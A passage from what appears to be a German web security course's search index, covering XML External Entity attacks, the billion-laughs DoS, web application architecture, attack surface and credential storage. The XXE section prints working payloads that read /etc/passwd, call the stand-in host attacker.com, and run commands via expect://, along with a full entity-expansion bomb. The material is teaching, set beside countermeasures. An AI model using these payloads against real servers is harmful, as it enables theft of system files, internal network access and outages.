XML-basierte DoS-Angriffe, werden in diesem Kapitel betrachtet. Beide basieren darauf, dass XML ein komplexes Datenformat besitzt welches durch einen ebenso komplexen Parser serverseitig analysiert werden muss.</p>"},{"location":"server-side-attacks/xml-based-attacks/#xml-external-entities","title":"XML External Entities","text":"<p>XML besitzt die M\u00f6glichkeit direkt innerhalb des XML-Dokuments Typdefinitionen zu inkludieren. Diese DTD (Document Type Definition) beginnt mit dem DOCTYPE Tag und kann auch External Entities definieren. Diese External Entities sind Verweise auf externe Datenquellen, diese werden durch den Parser automatisch in das XML-Dokument eingef\u00fcgt.</p> <p>Ein Beispiel f\u00fcr einen XML External Entities Angriff der auf die Extraktion lokaler Daten zielt:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [  \n  &lt;!ELEMENT foo ANY&gt;\n  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre> <p>Bei diesem Beispiel wird ein neues Element (foo), und als m\u00f6glicher Wert f\u00fcr dieses Element die externe Datenquelle /etc/passwd als Referenz &amp;xxe definiert. Anschlie\u00dfend wird dieser Elementtyp auch sofort samt der Referenz verwendet. Erlaubt ein Server das Parsen dieses XML-Dokumentes w\u00fcrde er nun diese Datei auslesen, deren Inhalt in das XML Dokument einf\u00fcgen und ggf. das ausgef\u00fcllte Dokument an den Client zur\u00fcckgeben. Somit kann der Angreifer auf eine Datei, auf die er eigentlich keinen Zugriff besitzen sollte mit den Rechten des Applikationsservers zugreifen.</p> <p>Ebenso kann auf eine Netzwerkadresse verwiesen werden:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [  \n  &lt;!ELEMENT foo ANY &gt;\n  &lt;!ENTITY xxe SYSTEM \"http://www.attacker.com/text.txt\" &gt;\n]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre> <p>In diesem Beispiel kann der Angreifer den XML-verarbeitenden Server dazu bringen, mittels HTTP GET auf die \u00fcbergebene URL (http://www.attacker.com/text.txt) zuzugreifen. Dadurch ergeben sich mehrere Angriffsm\u00f6glichkeiten:</p> <ul> <li> <p>Der Angreifer kann den Webserver zum \u201cBesuch\u201d einer Webseite   bringen, bei diesem Besuch wird zumeist auch die \u00f6ffentliche   IP-Adresse des Webservers auf dem besuchten Webserver vermerkt. Bei   Inhalten die z.B. gegen das Verbotsgesetz versto\u00dfen kann dies   negative Publicity f\u00fcr den Betreiber des XML-verarbeitenden   Webservers bewirken.</p> </li> <li> <p>Da der Zugriff vom XML-verarbeitenden Server ausgeht, kann der   Angreifer einen HTTP GET Request auf interne Server absetzen, die   ansonsten durch eine initiale Firewall blockiert gewesen w\u00e4ren.</p> </li> <li> <p>Der Angreifer kann ebenso auf localhost, sprich dem eigenen   Server, zugreifen. H\u00e4ufig werden interne Administrationsprogramme so   konfiguriert, dass diese nur auf Localhost lauschen (als   Sicherheitsmassname um remote Angreifern den Zugriff zu   unterbinden). Im Zuge eines XML External Entity basierten Angriffs   kann ein Angreifer diesen Schutz aushebeln und direkt auf localhost   zugreifen.</p> </li> <li> <p>Bei einigen Protokollen (http, smb, cifs) werden automatisch Tokens   und Credentials vom XML-verarbeitenden Server aus zum Zielserver   verschickt. Ein Angreifer kann dies z.B. missbrauchen um bei einem   Windows-basierten Server via SMB NTLM-Hashes zu extrahieren und   gegen diese offline einen Brute-Force Angriff durchzuf\u00fchren.</p> </li> </ul> <p>Ein XML External Entity kann auch auf virtuelle Adressen verweisen. So wird z.B. vom PHP XML Parser als Schema expect angeboten. Bei diesem Schema wird die \u00fcbergebene URL als Systemkommando ausgef\u00fchrt und dessen Ergebnis in das XML-Dokument eingef\u00fcgt. Ein Angreifer kann dies missbrauchen um Systemkommands (Command Injection) auszuf\u00fchren:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n  &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;\n  &lt;!ENTITY xxe SYSTEM \"expect://id\" &gt;\n]&gt;\n&lt;creds&gt;\n  &lt;user&gt;&amp;xxe;&lt;/user&gt;\n  &lt;pass&gt;mypass&lt;/pass&gt;\n&lt;/creds&gt;\n</code></pre> <p>In diesem Fall wird als Benutzername die Ausgabe des UNIX-Systemkommandos id eingef\u00fcgt.</p>"},{"location":"server-side-attacks/xml-based-attacks/#gegenmanahmen","title":"Gegenma\u00dfnahmen","text":"<p>Die bevorzugte Gegenma\u00dfnahme ist es, den verwendeten Parser so zu konfigurieren, dass er keinen Zugriff auf XML External Entities zul\u00e4sst. H\u00e4ufig wird auch die Verwendung \u201ceinfacherer\u201d Dokumentenformate als Gegenma\u00dfnahme vorgeschlagen: dies ist allerdings IMHO nicht der beste Weg, da auch die Parser einfacher Dokumentenformate (wie z.B. CSV und JSON) ebenso Schwachstellen besitzen.</p>"},{"location":"server-side-attacks/xml-based-attacks/#denial-of-service-attacks","title":"Denial-of-Service Attacks","text":"<p>Ein weiteres Problem von External Entities ist es, dass hierdurch schnell tiefe und breite Datenstrukturen aufgebaut werden k\u00f6nnen. Versucht ein Parser nun diese Datenstruktur in-memory zu bauen, kann ein Parser sehr schnell out-of-memory gehen und dadurch einen Speicher-basierten DoS-Angriff durchf\u00fchren.</p> <p>Ein bekanntes Beispiel sind Million-Laugh Angriffe:</p> <pre><code>&lt;!DOCTYPE root [\n &lt;!ELEMENT root ANY&gt;\n &lt;!ENTITY LOL \"LOL\"&gt;\n &lt;!ENTITY LOL1 \"&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;\"&gt;\n &lt;!ENTITY LOL2 \"&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;\"&gt;\n &lt;!ENTITY LOL3 \"&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;\"&gt;\n &lt;!ENTITY LOL4 \"&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;\"&gt;\n &lt;!ENTITY LOL5 \"&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;\"&gt;\n &lt;!ENTITY LOL6 \"&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;\"&gt;\n &lt;!ENTITY LOL7 \"&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;\"&gt;\n &lt;!ENTITY LOL8 \"&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;\"&gt;\n &lt;!ENTITY LOL9 \"&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;\"&gt; \n]&gt;\n&lt;root&gt;&amp;LOL9;&lt;/root&gt;\n</code></pre> <p>Bei dieser Angriffsart wird LOL9 durch 10 Elemente des Types LOL8 ersetzt. Jedes dieser 10 LOL8 Elemente wird mit mit 10 LOL7 Elementen gebaut, etc. In Summe erzeugt dieses DTD rund drei Milliarden LOL Elemente. Falls ein Parser versucht diese im Arbeitsspeicher zu erstellen, wird dieser mit hoher Wahrscheinlichkeit nicht ausreichend sein.</p>"},{"location":"web-applications/web_applications/","title":"Web Applikationen","text":"<p>Der Gegenstand unserer Untersuchungen ist eine programmierte Webapplikation. Dieses Kapitel soll ein Grundverst\u00e4ndnis \u00fcber den Aufbau einer Webapplikation bieten.</p>"},{"location":"web-applications/web_applications/#struktur","title":"Struktur","text":"<p>Eine Webapplikation besitzt sowohl eine interne Architektur (Struktur der Applikation bzw. des Source Codes) als auch eine Systemarchitektur (Integration mit externen Systemen). Eine Webapplikation wird in einer oder mehreren Programmiersprachen implementiert, zumeist unter Zuhilfenahme von Web-Frameworks bzw. -bibliotheken. Diese k\u00f6nnen auch Bestandteil der Standardbibliothek einer der verwendeten Programmiersprachen sein.</p> <p>Das Werk des Entwicklers ist der Source Code, welcher die ben\u00f6tigten Funktionen der Webapplikation implementiert. In Abh\u00e4ngigkeit von der verwendeten Technologie wird dieser Code auf den Applikationsserver als Source Code oder in kompilierter Form eingespielt und auf diesem schlussendlich auch exekutiert. W\u00e4hrend der Exekution wird zumeist ein Applikationsserver involviert. Dieser kann entweder als eigenst\u00e4ndiger Prozess (z.B. Apache Tomcat als Applikationsserver f\u00fcr Java Servlets), innerhalb des Webservers (z.B. die Kombination von Apache Webserver mit mod_php f\u00fcr PHP) oder sogar ein Teil des kompilierten Programms sein (z.B. bei Verwendung von statischen Binaries mit Go oder Rust).</p> <p>Ein h\u00e4ufiges Problem ist die Zuordnung der Admin-Verantwortung zu den jeweiligen Komponenten. Es kann passieren, dass Entwickler davon ausgehen, dass eine Komponente von Administratoren verwaltet wird und vice versa. Dadurch kann es zum Unterlassen wichtiger Updates kommen.</p>"},{"location":"web-applications/web_applications/#wahl-der-programmiersprache","title":"Wahl der Programmiersprache","text":"<p>Zur Umsetzung einer Applikation wird eine Programmiersprache bem\u00fcht. Je nach Abstraktionslevel und Zielpublikums der Programmiersprache (bzw. des verwendeten Frameworks) ergeben sich positive und negative Auswirkungen auf die Sicherheit der Applikation.</p> <p>Hierdurch sollte allerdings kein Chauvinismus bedingt werden. Es ist sowohl m\u00f6glich in einer sicheren Programmiersprache unsicher zu programmieren als auch vice versa. Programmierer sollten sich der jeweiligen Eigenarten der gew\u00e4hlten Programmiersprache bewusst sein und ggf. vorsorglich gewisse Features nur unter Bedacht einsetzen.</p> <p>Einflussreicher auf die Sicherheit der Applikation ist die Selektion von sicheren Bibliotheken und Komponenten. Hier sollten Komponenten mit einer guten Sicherheitshistorie gew\u00e4hlt werden, es ist essentiell, zeitnahe auch Sicherheitsupdates f\u00fcr verwendete Komponenten einzuspielen.</p>"},{"location":"web-applications/web_applications/#interne-architektur","title":"Interne Architektur","text":"<p>Die interne Struktur beschreibt, wie die Webapplikation selbst gebaut, und der Code strukturiert wurde \u2014 also wie die Funktionen auf Source-Code Komponenten aufgeteilt wurden. Die interne Architektur wird stark durch das verwendete Framework und der verwendeten Programmiersprache gepr\u00e4gt. Es ist sinnvoll, sich an die Annahmen und Konventionen des verwendeten Frameworks zu halten anstatt gegen diese Konventionen anzuk\u00e4mpfen.</p>"},{"location":"web-applications/web_applications/#request-routing","title":"Request-Routing","text":"<p>Ein guter Unterscheidungspunkt ist, wie der Webserver erkennen kann, dass ein eingehender HTTP Request \u00fcber einen Applikationsserver, und damit als Applikationscode, ausgef\u00fchrt werden soll. Initial wurde dies prim\u00e4r \u00fcber die Dateien im Dateisystem erkannt. Ein Beispiel: gegeben ein Webroot von <code>/var/www/</code> und eine Datei <code>/var/www/operation.php</code> wird ein Aufruf der zugeordneten Webseite <code>https://www.example.local/operation.php</code> an die Datei <code>operation.php</code> weitergeleitet und (falls PHP am Server konfiguriert wurde) als PHP Applikation ausgef\u00fchrt. Dieser Aufbau ist fehleranf\u00e4llig: falls ein Entwickler eine .php-Datei am Server vergisst oder ein Angreifer eine zus\u00e4tzliche .php-Datei am Server hochladen kann, kann es zu einer ungewollten Code-Execution kommen. Neuere Frameworks bieten zumeist die M\u00f6glichkeit, ein explizites Request-Routing zu definieren, so k\u00f6nnte z.B. das PHP-Framework Laraval mit folgender <code>routes/web.php</code> Konfiguration gestartet werden:</p> <pre><code>    Route::get('/operation.php', 'SomeController@operation');\n</code></pre> <p>In diesem Fall wird ein eingehender Request auf <code>/operation.php</code> an die Methode operation des Controllers SomeController weitergeleitet. Auf diese Weise wird explizit definiert, welche Operationen wie erreichbar sind und wo sich der aufzurufende Source-Code befindet. Falls ein Angreifer eine zus\u00e4tzliche PHP-Datei am Webserver hinterlegt, fehlt diese Routing-Konfiguration und sie wird vom Applikationsserver nicht verwendet.</p>"},{"location":"web-applications/web_applications/#model-view-controller-mvc-pattern","title":"Model-View-Controller (MVC) Pattern","text":"<p>Ein h\u00e4ufiges Muster f\u00fcr die interne Code-Struktur ist das MVC-Pattern. Hier wird die Funktionalit\u00e4t auf folgende groben Bereiche aufgeteilt:</p> <p>Model ist zust\u00e4ndig f\u00fcr die Speicherung von Daten. Zumeist wird die Gesch\u00e4ftslogik innerhalb des Models abgebildet (thin controller, fat model).</p> <p>View : eine View dient zur Darstellung von Daten. Zumeist wird jede einzelne Webseite \u00fcber ein View-Objekt abgebildet. Mehrere View-Objekte pro Datum sind m\u00f6glich, so kann z.B. das gleiche Model mittels einer View als Webseite ausgegeben ausgegeben, und mittels eines weiteren View-Objekts als Excel-Sheet heruntergeladen, werden.</p> <p>Controller akzeptiert Eingaben (z.B. HTTP- oder WebSocket-Requests), \u00fcberpr\u00fcft diese und interagiert mit dem Model um Gesch\u00e4ftsprozesse anzusto\u00dfen. Um eine Antwort gegen\u00fcber dem Client zu pr\u00e4sentieren, werden Daten vom Controller an die View-Objekte \u00fcbergeben.</p> <p>Klassische Webapplikationen waren historisch thin-client Applikationen: die gesamte Logik wird server-seitig ausgef\u00fchrt, der Client (Webbrowser) dient rein zur statischen Darstellung. Mit JavaScript entstand die M\u00f6glichkeit, innerhalb des Browsers Code auszuf\u00fchren. Einige Frameworks wie Angular.js oder React implementieren das MVC-Pattern samt Routing innerhalb des Browsers. Der Server dient als Datenquelle und bietet jene zumeist \u00fcber Webservices an.</p> <p></p> <p>Die Wahl der Struktur besitzt Einfluss auf Sicherheitsentscheidungen der Applikation. Bei einem klassischen server-seitigen MVC-Pattern werden z.B. technische \u00dcberpr\u00fcfungen auf Schadcode in User-Eingaben, Authentication- und Authorization-Checks innerhalb von Controllern implementiert. Wird client-seitig JavaScript verwendet, muss der server-seitige Service eine \u00dcberpr\u00fcfung der JavaScript-Anfragen auf Schadcode, Authentication- und Authorization durchf\u00fchren.</p>"},{"location":"web-applications/web_applications/#single-page-applications-und-progressive-web-applications","title":"Single-Page Applications und Progressive Web Applications","text":"<p>Die M\u00f6glichkeiten von JavaScript und HTML5 wurden immer m\u00e4chtiger. Dies f\u00fchrte zu Architekturen wie Single-Page Applications (SPA) bei denen alle Inhalte dynamisch per JavaScript geladen bzw. generiert werden.</p> <p>Werden diese SPAs mit HTML5 Offline-F\u00e4higkeiten (HTML5 localStorage) und langlebigen nebenl\u00e4ufigen JavaScript-Prozessen (HTML5 WebWorker) kombiniert, k\u00f6nnen offline lauff\u00e4hige Webseiten geschrieben werden, die klassischen Desktop-Applikationen sehr \u00e4hnlich sind. Diese werden h\u00e4ufig Progressive Web Applications (PWA) genannt. Werden Daten offline gespeichert, m\u00fcssen deren Integrit\u00e4t und Vertraulichkeit mit geeigneten Methoden gew\u00e4hrleistet werden.</p>"},{"location":"web-applications/web_applications/#system-architektur-einer-primitiven-web-applikation","title":"System-Architektur einer primitiven Web-Applikation","text":"<p>Eine einfache Webapplikation wird zumeist aus drei groben Komponenten bestehen:</p> <ul> <li> <p>Webserver: dient zur Bereitstellung statischer Dateien und leitet   dynamische Anfragen an die jeweiligen Applikationsserver weiter.   Webserver sind optimiert f\u00fcr das effiziente Zustellen statischer   Inhalte. Unter POSIX-Betriebssystemen wie Linux befinden sich am   Websever die Web-Dateien h\u00e4ufig im Verzeichnis <code>/var/www</code>.</p> </li> <li> <p>Applikationsserver: beinhalten die Applikation und bieten die   Laufzeitumgebung der Applikation an. Die Applikation kommuniziert   mit einer Datenbank zur Speicherung dynamischer Daten.</p> </li> <li> <p>Datenbank: beinhaltet dynamische Daten.</p> </li> </ul> <p>Die Bearbeitung einer Client-Anfrage durch den Applikationsserver kann l\u00e4ngere Zeit ben\u00f6tigen. W\u00e4hrend der Bearbeitung blockiert der Applikationsserver \u2014 um einen h\u00f6heren Durchsatz und geringere Latenzzeiten zu erreichen wird h\u00e4ufig ein Webserver mit mehreren Applikationsservern kombiniert.</p> <p>Je nach Webserver- und Applikationsserverimplementierung kann der Applikationsserver Teil des Webservers sein. Intern sind die Funktionalit\u00e4ten allerdings getrennt. Im Sinne von Separation of Concerns ist es vorteilhaft, Applikationsserver und Webserver zu trennen. Dadurch ist es m\u00f6glich, die unterschiedlichen Serverprozesse mit eigenst\u00e4ndigen Benutzerrollen zu betreiben.</p>"},{"location":"web-applications/web_applications/#potentielle-zusatzliche-komponenten-bei-webapplikationen","title":"Potentielle zus\u00e4tzliche Komponenten bei Webapplikationen","text":"<p>W\u00e4hrend Webserver, Applikationsserver und Datenbank zum Betrieb einer dynamischen Webapplikation prinzipiell ausreichen, kann es zu einer Inflation von externen Komponenten kommen, dies wird in folgender Grafik gezeigt:</p> <p></p> <p>Beispiel der Komponenten einer Webapplikation</p> <ul> <li> <p>Load-Balancer: verteilen den Traffic auf mehrere Webserver. Hier   kann es zu Problemen beim Session-Management kommen.</p> </li> <li> <p>Content Delivery Networks (CDNs): dienen zur Performancesteigerung   bei der Zustellung statischer Daten. Die Inhalte werden \u00fcber ein   geographisch verteiltes Netzwerk direkt an die Clients zugestellt.</p> </li> <li> <p>Caching Services werden verwendet, um h\u00e4ufig ben\u00f6tigte Daten oder   Webseitenfragmente zwischenzuspeichern. Zumeist geschieht dies   in-memory, bekannte Produkte sind z.B. memcached. Ein h\u00e4ufiges   Problem ist, dass der Zugriff ohne \u00dcberpr\u00fcfung der Autorisierung   erfolgt. Somit erh\u00e4lt ein Angreifer mit Zugriff auf einen Caching   Service potentiell auch Zugriff auf sensible Daten.</p> </li> <li> <p>Job Server: eine Client-Anfrage muss innerhalb kurzer Zeit   beantwortet werden, falls dies nicht erfolgt kann im worst-case der   Client-Browser die Verbindung unterbrechen. Um trotzdem langfristige   Operationen auszuf\u00fchren, k\u00f6nnen diese nebenl\u00e4ufig durch einen   Job-Servers ausgef\u00fchrt werden. Bekannte Produkte in diesem Umfeld   sind RabbitMQ oder Redis. Ein potentielles Problem ist, dass Jobs   Datenbankzugriffe ben\u00f6tigen und daher der Job Worker eine bestehende   Verbindung zur Datenbank besitzt (welche von einem Angreifer   ausgenutzt werden kann).</p> </li> <li> <p>Full-Text Search: viele Webapplikationen ben\u00f6tigen eine   Volltextsuche, diese wird teilweise \u00fcber einen externen Suchserver   implementiert. Dieser beinhaltet eine bearbeite Version des   Datenbestands der Datenbank. Ein m\u00f6gliches Problem sind fehlende   Berechtigungs\u00fcberpr\u00fcfungen \u2014 w\u00e4hrend auf der Datenbank der   Datenzugriff zwar eingeschr\u00e4nkt wird, wird dies h\u00e4ufig innerhalb der   Suchdatenbank vergessen.</p> </li> <li> <p>External Services werden h\u00e4ufig von Webapplikationen aufgerufen bzw.   integriert. Ein Problem dabei ist, dass Webapplikationen h\u00e4ufig   davon ausgehen, dass externe Services sich an definierte Protokolle   halten.</p> </li> </ul>"},{"location":"web-applications/web_applications/#angriffsflacheattack-surface","title":"Angriffsfl\u00e4che/Attack Surface","text":"<p>Die Angriffsfl\u00e4che ist jener Bereich, auf den ein potentieller Angreifer Zugriff erh\u00e4lt. Die extern sichtbare Webapplikation ist Teil der Angriffsfl\u00e4che. Im Sinne der Systemsicherheit sollten Entwickler versuchen, die Angriffsfl\u00e4che zu minimieren. Problematisch ist, dass die Angriffsfl\u00e4che nicht nur die direkte Applikation, sondern auch alle verbundenen Funktionen und Komponenten, beinhaltet. Bei der Definition der Angriffsfl\u00e4che sollten u.a. folgende Fragen gestellt werden:</p> <ul> <li> <p>Sind interne Anwender potentielle Angreifer? In diesem Fall w\u00e4ren   auch interne Schnittstellen Teil der Angriffsfl\u00e4che.</p> </li> <li> <p>Sind Administratoren potentielle Angreifer? In diesem Fall w\u00e4ren   auch etwaige Administrationswebseiten Teil der Angriffsfl\u00e4che.</p> </li> <li> <p>Besitzt der Angreifer Zugriff auf Backups oder Logdateien?</p> </li> <li> <p>Besitzt ein Angreifer Zugriff auf externe Services und sind daher   die Callbacks innerhalb der Applikation Teil der Angriffsfl\u00e4che?</p> </li> </ul>"},{"location":"web-applications/web_applications/#wartungszustandigkeiten","title":"Wartungszust\u00e4ndigkeiten","text":"<p>Ein Problem bei Webapplikationen mit vielen Komponenten ist die Wartungsverantwortlichkeit. Die Applikation wird durch Softwareentwickler bereitgestellt, die Wartung der jeweiligen Komponenten erfolgt meistens durch Administratoren.</p> <p>Beispiel: eine Applikation ben\u00f6tigt einen Java-Applikationsserver (z.B. Tomcat). Die Administratoren setzen einen Linux Server auf und installieren manuell Tomcat (Download von der Hersteller-Website) da eine spezielle Tomcat Version ben\u00f6tigt wird. Die Entwickler \u00fcbergeben den kompilierten Source Code als war-File welches von den Admins eingespielt wird. Das Betriebssystem wird regelm\u00e4\u00dfig \u00fcber dessen Update-Mechanismus upgedatet. Der Applikationsserver kann nicht automatisch upgedatet werden, da hier erst von den Entwicklern das okay kommen muss. Wer \u00fcbernimmt das Update das Applikationsservers (das nicht automatisiert werden kann)?</p> <p>Durch das Outsourcing von Funktionalit\u00e4t in die Cloud wurde dieses Problem noch versch\u00e4rft, folgende Grundregeln k\u00f6nnen angenommen werden:</p> <ul> <li> <p>Self-hosted Server mit eigener Applikation: hier ist der   Betreiber/Entwickler f\u00fcr die Wartung aller Komponenten (inkl.   Firmware, Lights-out-Management/BMC, Netzwerkinfrastruktur)   zust\u00e4ndig.</p> </li> <li> <p>Infrastructure-as-a-Service (IaaS): hier ist der Anbieter (z.B.   Amazon mit seinem EC2 Dienst) f\u00fcr die Hardware, Virtualisierung,   Firmware und Netzwerkhardware zust\u00e4ndig. Der eingemietete User ist   f\u00fcr Betriebssystem, Laufzeitumgebung, lokale betriebene   Hintergrunddienste wie z.B. Datenbanken und die Applikation   zust\u00e4ndig.</p> </li> <li> <p>Plattform-as-a-Service: hier ist der Anbieter (z.B. Heroku)   zus\u00e4tzlich (zu den IaaS Dingen) noch f\u00fcr das Betriebssystem, die   Laufzeitumgebung und Hintergrundservices zust\u00e4ndig.</p> </li> <li> <p>Software-as-a-Service (SaaS): hier ist der Anbieter der Software   (z.B. gmail) f\u00fcr die Wartung aller Komponente zust\u00e4ndig.</p> </li> </ul>"},{"location":"web-applications/web_applications/#speicherung-von-passwortern","title":"Speicherung von Passw\u00f6rtern","text":"<p>Wenn Credentials unbedingt innerhalb der Applikation gespeichert werden m\u00fcssen, sind Schutzma\u00dfnahmen f\u00fcr deren Vertraulichkeit unabdingbar. Sie d\u00fcrfen niemals in plain-text (unverschl\u00fcsselt) persistiert werden, sondern sollten so fr\u00fch wie m\u00f6glich mittels einer Einwegfunktion transformiert werden. Dies sollte innerhalb der Applikation und nicht erst z.B. in einer nachgelagerten Datenbank geschehen. W\u00fcrde dies z.B. mittels eines Datenbanktriggers durchgef\u00fchrt werden, muss die Applikation das Passwort an die DB \u00fcbergeben: falls die DB nun das Passwort unsicher bearbeitet oder speichert (DB-Logs, Journal, Fehlerlogs) kann dies durch die Applikation nicht beeinflusst werden.</p> <p>Als Einwegfunktion wird zumeist eine kryptographische Hash-Variante verwendet. Da Hashes auf deren Geschwindigkeit hin optimiert wurden, sind diese eigentlich suboptimal f\u00fcr Passwort-Hashing geeignet: durch diese Optimierung kann ein Angreifer ebenso effizient einen Brute-Force-Angriff durchf\u00fchren. Aus diesem Grund sind Key-Derivation-Functions (KDFs) vorzuziehen. Dies sind Verfahren, die \u201ckonfigurierbar langsam\u201d sind. Sie werden so langsam konfiguriert, dass sie im Normalbetrieb noch keinen \u00fcbertriebenen negativen Impact auf die Performance besitzen, aber gleichzeitig wirkungsvoll Brute-Force-Angriffe unterbinden. Beispiele f\u00fcr KDFs sind PDKDF2, bcrypt und scrypt.</p> <p>Werden Hashes extrahiert k\u00f6nnen offline Brute-Force Angriffe gegen diese Hashes verwendet werden. Diese verwenden meistens multiple Grafikkarten und ben\u00f6tigen keine online Verbindung zu der Online-Applikation. Die dabei erreichten Geschwindigkeiten sind um eine Vielzahl h\u00f6her als die bei Online-Brute Force Angriffen erreichte Geschwindigkeit[2].</p> <p>Ein weiteres Problem des Offline-Crackings von Passw\u00f6rtern ist, dass es f\u00fcr den Betreiber der Webseite keine Detektionsm\u00f6glichkeit des Vorgangs gibt. Wird ein Brute-Force Angriff gegen\u00fcber einem Login-Formular durchgef\u00fchrt, kann ein Betreiber in Echtzeit dies erkennen und potentiell Gegenma\u00dfnahmen treffen. Wird eine Datenbank offline angegriffen, gibt es hier keine Interaktion mit dem Betreiber, somit kann dies auch nicht automatisiert erkannt werden.</p>"},{"location":"web-applications/web_applications/#umgang-mit-credentials-in-frameworks","title":"Umgang mit Credentials in Frameworks","text":"<p>Applikationen ben\u00f6tigen Konfigurationsdaten um effektiv funktionieren zu k\u00f6nnen. Typische Daten, die in Konfigurationsdateien gefunden werden k\u00f6nnen, inkludieren zum Beispiel Datenbankverbindungsdaten inkl. Credentials, Zugangsdaten f\u00fcr verbundene Drittsysteme als auch Secrets (z.B. geheime Passphrasen f\u00fcr das Verifizieren von Sessions und/oder Tokens). W\u00fcrden diese Daten direkt im Source Code hinterlegt werden, kann dies negative Auswirkung auf die Sicherheit haben. Ein Angreifer mit Zugriff auf den Source Code w\u00fcrde Zugriff auf diese Zugangsdaten erhalten. Diese Angriffsfl\u00e4che sollte nicht untersch\u00e4tzt werden, da der Source Code h\u00e4ufig sowohl auf Entwicklungs- als auch Produktionsservern installiert ist. Zus\u00e4tzlich wird Source Code normalerweise in Versionierungssystemen (VCS, Version Control Systems, wie z.B. Subversion oder Git) gespeichert und durch eine (kurzfristige) Fehlkonfiguration kann diese Daten \u00f6ffentlich verf\u00fcgbar machen. Aus diesem Grund sollten niemals Credentials unverschl\u00fcsselt in Source Code Repositories gespeichert werden.</p>"},{"location":"web-applications/web_applications/#konfigurationsmanagement-mit-dotenvenv-dateien","title":"Konfigurationsmanagement mit dotenv/.env Dateien","text":"<p>Eine niederschwellige Art des Konfigurationsmanagement kann durch das dotenv bzw. .env System erreicht werden.</p> <p>Betriebssysteme bieten sog. environment variables, auf Deutsch Umgebungsvariablen. Dies sind Variablen, die innerhalb des Betriebssystems manuell oder automatisiert gesetzt, und von Programmen ausgelesen werden k\u00f6nnen. Die Variablen, die innerhalb einer Shell-Session gesetzt wurden, k\u00f6nnen nur innerhalb dieser Session verwendet werden. Durch dieses Verhalten werden die Variablen unterschiedlicher User und Programme voneinander abgegrenzt.</p> <p>Der grunds\u00e4tzliche Ansatz ist, dass alle Secrets und Konfigurationsvariablen im Source Code durch Abfragen von Umgebungsvariablen ersetzt werden. Auf diese Weise verschwinden diese sensiblen Daten zumindest aus dem Source Code, sie m\u00fcssen allerdings durch den Entwickler/Administrator vor dem Start der Applikation in der Umgebung gesetzt werden (ansonsten w\u00fcrde das startende Programm die notwendigen Konfigurationsdaten nicht erhalten).</p> <p>dotenv versucht diesen Ansatz praktikabler zu gestalten: im Projektverzeichnis wird eine .env-Textdatei angelegt. In dieser steht pro Zeile ein Key/Value-Paar, z.B. Konfigurationsname=Konfigurationswert. Wird die Applikation gestartet, liest diese initial das .env-File aus und geht die Liste der definierten Variablen durch. Wird im environment file ein Konfigurationsname gefunden f\u00fcr den noch keine Umgebungsvariable vorhanden ist, wird eine neue Umgebungsvariable mit im .env File gespeicherten Wert als Wert angelegt. Ist eine environment variable mit dem Namen bereits bekannt, wird nichts unternommen (die bestehende Umgebungsvariable wird nicht \u00fcberschrieben, beh\u00e4lt ihren Wert und das ausgef\u00fchrte Programm erh\u00e4lt so den bereits konfigurierten Wert der Umgebungsvariablen). Das .env-File wird nicht in die Versionskontrolle eingecheckt, bei git kann es beispielsweise im .gitignore-File vermerkt werden. Dadurch werden die Konfigurationswerte bzw. die konfigurierten Secrets niemals in die Versionskontrolle aufgenommen.</p> <p>Da bestehende Umebungsvariablen nicht \u00fcberschrieben werden, f\u00fcgt sich dieses System gut in bestehende Container-Umgebungen ein. Bei diesen k\u00f6nnen zumeist im Administrationsbereich des Container-Managements Umgebungsvariablen gesetzt werden. Diese werden bei Verwendung von .env-Dateien gegen\u00fcber den Konfigurationswerten aus dem .env-File bevorzugt und f\u00fcr das Starten/Konfigurieren des Containers verwendet.</p>"},{"location":"web-applications/web_applications/#credentials-in-ruby-on-rails","title":"Credentials in Ruby on Rails","text":"<p>Als Beispiel wird hier kurz das Credential-Konzept von Ruby on Rails (Version 5.2) vorgestellt. Innerhalb des Repositories gibt es eine Datei credentials.yml.enc in welcher Credentials bzw. private Schl\u00fcssel abgelegt werden k\u00f6nnen. Diese Datei wird immer verschl\u00fcsselt, der Entschl\u00fcsselungsschl\u00fcssel wird unter config/master.key gespeichert und wird nicht in der Versionskontrolle eingecheckt (bzw. wird dieses File explizit mittels .gitignore von der Versionskontrolle ausgenommen). Entwickler m\u00fcssen diesen Schl\u00fcssel manuell zwischen den Entwicklungsworkstations kopieren, beim Deployen auf einen Server kann dieser Schl\u00fcssel z.B. \u00fcber eine Umgebungsvariable dem Webserver mitgeteilt werden. Innerhalb des Ruby on Rails Sourcecodes kann man \u00fcber die Variable Rails.credentials.key auf den Schl\u00fcssel key zugreifen (der 